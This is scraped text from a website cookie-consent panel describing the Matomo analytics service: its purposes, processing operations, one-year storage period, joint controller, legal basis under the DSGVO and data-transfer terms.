### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all


